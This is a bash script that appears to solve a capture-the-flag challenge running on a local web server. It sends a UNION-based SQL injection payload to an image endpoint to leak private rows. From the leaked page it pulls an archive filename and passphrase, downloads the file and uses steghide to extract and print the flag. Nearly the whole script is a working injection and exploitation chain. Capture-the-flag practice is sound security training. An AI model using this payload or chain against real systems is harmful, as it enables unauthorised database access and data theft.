#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${1:-http://127.0.0.1:8084}"
WORKDIR="$(mktemp -d)"
trap 'rm -rf "$WORKDIR"' EXIT

curl -s "$BASE_URL/image?id=-1%27%20UNION%20SELECT%20title,filename,description%20FROM%20images%20WHERE%20is_public=0--" > "$WORKDIR/leak.html"
FILENAME="$(grep -oE 'archive_[0-9]+\.jpg' "$WORKDIR/leak.html" | head -n1)"
PASS="$(grep -oE 'passphrase: [^<]+' "$WORKDIR/leak.html" | head -n1 | cut -d' ' -f2-)"

curl -s "$BASE_URL/download?file=$FILENAME" -o "$WORKDIR/$FILENAME"
MALLOC_CHECK_=0 steghide extract -sf "$WORKDIR/$FILENAME" -p "$PASS" -xf "$WORKDIR/flag.txt" -f >/dev/null
cat "$WORKDIR/flag.txt"
